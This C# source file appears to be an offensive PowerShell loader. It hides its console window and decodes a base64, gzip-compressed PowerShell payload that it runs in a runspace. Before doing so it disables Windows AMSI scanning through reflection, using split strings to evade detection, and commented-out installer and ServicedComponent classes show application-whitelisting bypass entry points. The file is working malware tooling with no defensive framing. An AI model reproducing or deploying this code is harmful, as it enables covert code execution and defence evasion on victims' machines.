using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
//using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
//using System.EnterpriseServices;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public static string p = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEgANABzAEkAQQBPAFgAegA5ADEANABDAC8ANQAxAFcAYgBWAFAAaQBTAEIARAArAG4AbAA4AHgAbABjAG8ASABzAGcAcwBEAGkATABJAHEAeABRAGUATQB1AEYASQByAHkAZwBLADYAVgAwAGQAWgBWADAAUABTAHcARwBqAEkAWgBHAGMAbQBDAHMAdgB4ADMANgA4AG4AaQBZAEQAdQArAFgATABIAEoAOQBMAFQAYgAwAC8AMwBNADkAMAB6AEcAaQB5AFYAaABqAG0AOQBCAEUAMABIAEkAQgArADQARAB6ADMAQgBJADkAMQBsAEUAWgB1AEMAdgBEADAAKwBOAGwASwBRAEgAawBqAE4ASgA5AHgAbgBHAG0ANQBZAHkAQQBPAG0AdQBZAGcAOABGAG8AWgBqADUAdAArAFQASgBsAGsANQBXAGkAYQB3AHQAaAB6AGwATgArADIAWgAxAHIARQA2AEwAcABlAFAAdgB0AEQAcQBYAG8AWAB1AEgAUgB6AFEAYQB1ADMAbwBlAEgAKwAvAFoAcQBQAEMAVwArAGQAbABGAGkAaQBJAEYASgBTADEARgBNAGsANABCAEQAVQBUAFEAbwBNAHMAVgArAHUAMQBhAGcAMgBQAGIAVwB1AFMAUgBMADYASgBUAGIAeABXAGwAeABTAGMAZQAxAGcAVwBuAGMANgBOAHUANwBLADAAWABHAEkAVwBEAEgATwA1AGgATQBmAFMAMQBmAGcATwBmAEUAMwBzAEgATgA0AEEALwBFAFIAeQB2AGEAUwBlAFgATQBaAGEAVABDAFcATABaADAAdgBhADUAMwBkAFIAdwBDAEQATQB3AEEAYQAyAHQAUwBZAEkAMABKAC8AOQBWAHoAOAB0AFUATgBuADMAVQB3AFcAbABlAE8AQQBCAFMAQgB2AHIAdwBXAGgAWABCAEkARABlAFIAbQArADYAOABIAGcAOABBADIAbABVAHMAZQBUAGUAaQBXAGMATQBlAHkAdwBJAGUARABSADkAMQB6AGIAWAB5ADQAMwAvAEIAQwBtAFUATQBUADgASgBoAFgAOAAvADQATAA5AE0AOABPAHIAZQBvAFIARgA5AGcAMgBVAHUAMgBEAHUAbwBXADMAeQBDAEIAYwBUAGEAVwBhAHUAbgB2ADMAUQBLAGUAcgBpAE0AbwBlAEQAUwBTAHoAWQBIAFUAbwBLAGYAQwBGADEATAA5AEcANgBqAEcAbgByAG8AMwBPAHkAawA0ADQAawBJAHEAYQBFAHgANgBKAGsAVQA4AHgATwBtAG8ATAA2AGYAYQBhAGQAKwAxAHgAYQBFAEMAcgBaAG0ASwBGAHQAYgA2AHkAdwBXADkAbQAwAFQARgAvACsALwBIAHgAaABUAC8AMgBCAGsANAAzAG8AbgBkAEcAWgBvAHAAQwBhADQAdwA5AFoAYgBDAHIAVQB2AHYAUwBjAEsASgBSAEYAUwB5AEIAbgB2AGgAQgBqAEMAUQB0AE4AMgA1AEEAdABUAFcAdwB4ADAAUABUAHcANwBwAEYAOQBCAG4AeQB3ADEAcQBJAEkAeABzAEYASwBXAEcAQgA0AGEASAA1AFoAagA2AG8AbwBCAFAAUQBsADQAUwA5AEEAeQA3AFoARQBzAG8ATgA3AEUAbgBBAEEAZABTAGgAYQBwAGkAWgBEAHoATQB4ADYAeABNAE8AMQBQAHcAUgBrAFgAUwBhAFYASQBuAEQARwA5AGcARwBpAHEAWgA2ADQAMQBHAG0ATwBFADAAZQAwAHQAYwBlAEwATQBJAFIAYgB2AE0AMwBFAG0AMQB1AC8AZwBoACsASQA1ADkATgBpADEAZAB1AEMAZAB0AGoAZgB3AEkAUABKAGYANABuAHUAcgBoAEUAYgBkAGMAcgBLAG0AagBVAGMAVgBTAHEAcwBIAHQAOAAvAFIAbQBtAFoAYQBUAHIAQwBMACsAQgBSADIARQBDAGYAbQBKAEgAZwBWAGMAYgBXACsAQQA1AG0AVQA4AE4AdQAxADMAaQB0ADgAbgB0AHcASAA4AHYAKwBnAEoAeQBkAHgATQBVAEUAKwBMADQAegA4AEcAWgBPADMARgBkAGQAMQBkADYAcQBIAGUAcQBVAGYATQBQAFoARABEAHAASABHAE8AbgBwAEMAMwBIAE4AdwB5AFMAcQBEAFgAVABEAG4AcAB3AGkAYgBsAE0ANABRAEgAOABNAFoARQBRAFQAbABiAHIAZQA4AHgASgAvAHQATgBqAEsAdABFAFEANQBLADAASAB4AHUATABtAGEAUABTAFEAWAB0AEIAZgBOADEAdwBRAG0ASwB1ADkAcABGAEoAMAByAEMAMABOAGoAYwB2ADIANQBqAFYANgByAGwAUwByADIAOABWADkAbQByADIAUAA5AHUAbgBWADAAbQBVAGcAbwAxAGwAaAA0AFQAaABRAFgAWAB5AFAAaABFAGcAWQB6AE0AcABXAG8AUwBHACsAZAB2AHoASgBSADYARgBEAEoANAArAHAAUgBpAHMAVQB4AGsAbQBIADgAKwArAHMAOABIADMAOAA1ADYAdwBHAEoANABhAFQARQBhAGwAdQBYAE0AbQBxAGkAZABCAHMAVAAyAHMAUwBnAGcAQgBXAFMAZgB3AG8AWQBvAHIASgAxAG0ATwBMAHEAcABkADkARwAvAHkAYgA1AHAAbAA5ADAASgBTAFUAcABUAFQAZgBhAHcAeQBEAGgAZQBIADMAMQA2AEQAZwB4AEgAcABLAEsAdABJAEMAagBZADUAMABKAHAAQgBEAEwATABMAHkANgBmAG8ARgA5ADMAaABjAHQARQA4AGwAZwBmADcANgB3AE0AeAB4AHkAOAB1AHkAVQBhAEcAMAB2AC8AaABhAGsAWgB5AFMAKwBEAFgAMgBPAEIAUwBxADAAcABJAHMAUABDAGQAcwBVAHYASABvAGEAcwBmAEUAQQByAHAAUABDAEQAUgA0AEYANABWAE8AUgB5AFMASwBvAFYAVwBtAGsAUQBGAE4AVAAzAEcAMgBSAFIAMwAzAGQASgBLADQANQBEAHcASwBKADgANAA3AHAAOABVAFAAdABDAGEAMwBWAFMAKwBIAFkAKwA3AEYANABVAFMAYwBqAHYAQQBRAG4AawAzAHcAdQBYAGUARABPAGsASgA1AFEAUAAwAFoANwBXAGoAZwA3AE4AeQB0AHMAagBBAHoAWgBoAGsAdQBkAG0ATwBPAEYAKwB5ADYAawBQAEUANQBDADQAUQBZAG8AMgBuAHEAWgAxAGYAbQBwAFUAeQBzAEQASAArAEsAMAAyADkAWQB6AHEAMQBxAEsAWQA3AHUAWQBuAGcAbQB6AG8AawBMAFoAdABRADQAZgBVAGIAVwA4AHcATQBIAGMAOAB1ADEAbABEAFUAVQByADMARABXAFQAWABaAGEAdABLAFMAaQAzAFYAQwB4AG0AUAB6AFAAMQBLADYAZQA4AEQAYwBoAGQASAB1AEMAOABoAFUATwBnAGgAdwBzAHgARQBsAHAAbgBLAE0AcAB1AG4ASwAzAGEATwBOAGEAWQBzADAAVwBLAGUAdgBoADkAbwBiADQAQwBqAEkAMABBAGgAWgB5AEgAWgBaAEYAWQAwAGUAVABRAE0AUwBMAG8AOQBOAG0ANAAzAEkAUgBxADQAcQBRADEAUAB5AEkAcQBZAHkAbQBFAEQAVAAyAEgAQwBrAGwAQwAvADAARABlADQARwB5AFIAcgBlAFYAbwBVAEkAMwB5AE0AVQBaAFMAYgBXACsAKwBiAGIANAAxAGYAWgBvAFAAeQBIAFkAbgBKAEsAUwAyAHcALwB6AFEAbwB5AE0AdQB1AGoAbgBiAGEAZABJADYAcwA3AE0AUABQAEIASgBUAE8AVgBNAHoAZQBUAHkAMgBMAHUAUABsAEEAbQBYAHYAVABPAFcAMwBtAFkAOABkADIATQB4AFIAawBaADAARABGAE8ATABwAEEARwBnAHgAKwA4AG0AOQB2AGgAQgA1ADIAegBlAGMAeABDADIAbABPADQAMAA2AGEAcQBsADUAaQBKAEIAeABlAFgAaQBJAGwAZgBwAHQAaAAvAFEAcQBiAFgAdgBlADAARQBTAEQAYQB4AE8AegBCADYAWQBjAFMATwBFAGwANABxAEQAdABSAFgANABSAG0AdAByAFcAQwBPAFkAKwA0ADAAcABMAGgAegBzAGkANABpAFIAMwB2AHEARQB5AGgAZwBFADUAZABIAEEARQBRAE4AdQAxAFAAOQB0AHEAMABLAC8AdgBBAEcANAB4AFAAdgBaAFcAVABOAE4AUABnADEARABEAG0ATQA1ADcAawBiADcAZABWADYAZwBpAGkAaAArAE0AdAAwAGMAMQBqAHcAcwBtAEUAdgBwAGoASABpAGMANABPAFgATQBkADIAVgA3AG4AbgBwAFAAbgBNAFoAbwAzAFYARgBrADEANwBJAHcAdQBRAHMAVAB4AHEATwBFAG4AagBOAHkAKwBaAHAATgBlAC8AOAB0AHEARAB3AFYAWAAvAHIAMQBiAGYATwArADgATQAyADkANwB3AHUAdAA5AHUATwBEAEUAUABHAG0AOAA5AGgANwBOAFgAYQB4AHcAMwBjAGUAVwBTAGsAbABtAHMANQA5ADkALwBMAG4ANQAwAE8ANgBkADMAUgA0AGUAOABmAFEAVQAzADQAWgBGAHEAegAzADUAOQBqAFMALwAwAFkAbgA3AFUATwAvAGcAagBtAFQAMQA4AEwAYwBmAHkAZQA2ADkAMQAzAFMAUwBsAEoAQwBLAE8AMgBEADUAYgAwAFoASABkADcAdgBlAHYAKwBtAGIATwA1AFEAVABKAGQAOQBWADIAbAA1AFUAeQBUAHUARwBGAGoAbAAyAEsAZgBZAGwAQwBnAFEATQAxADMANABrAEsAMgAyAG4AbwBFAE0ARAAvAHkAcwBmAEEAeQBBAFAAbgBZAHcAdgAzAGsAWgBtAEcAOQBpAGQAMAA5AHMAawAyAHcAegAvACsAbQAzAEIAWQBtAE4AZABZAGkAagA3AFQAMwBtAEIAWQBXAHcAUABOAHAAQwA0AE4AUQBvAEMAWQAxAEMAcQBWAEQAMgBqAFYAWAA5AFgANgBCAC8AWgBVAGwARABYAGcARABBAEEAQQAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA";
        public Program() {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            try
            {
                var amsi = scriptInvoker.GetType().Assembly.GetType("Syste" + "m.Management.Autom" + "ation.Ams" + "iUtils");
                var amsifield = amsi.GetField("am" + "siIni" + "tFailed", BindingFlags.NonPublic | BindingFlags.Static);
                amsifield.SetValue(null, true);
            } catch { }
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}

//public class Bypass : ServicedComponent
//{
//	[ComRegisterFunction]
//	public static void RegisterClass (string key)
//	{
//		Program.Main(); 
//	}
//	
//	[ComUnregisterFunction]
//	public static void UnRegisterClass (string key)
//	{
//		Program.Main(); 
//	}
//}
//    
//[System.ComponentModel.RunInstaller(true)]
//public class Sample : System.Configuration.Install.Installer
//{
//    public override void Uninstall(System.Collections.IDictionary savedState)
//    {
//        Program.Main();       
//    }
//    public static string InvokeAutomation(string cmd)
//    {
//        Runspace newrunspace = RunspaceFactory.CreateRunspace();
//        newrunspace.Open();
//        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
//        Pipeline pipeline = newrunspace.CreatePipeline();
//
//        pipeline.Commands.AddScript(cmd);
//        Collection<PSObject> results = pipeline.Invoke();
//        newrunspace.Close();
//
//        StringBuilder stringBuilder = new StringBuilder();
//        foreach (PSObject obj in results)
//        {
//            stringBuilder.Append(obj);
//        }
//        return stringBuilder.ToString().Trim();
//    }
//}
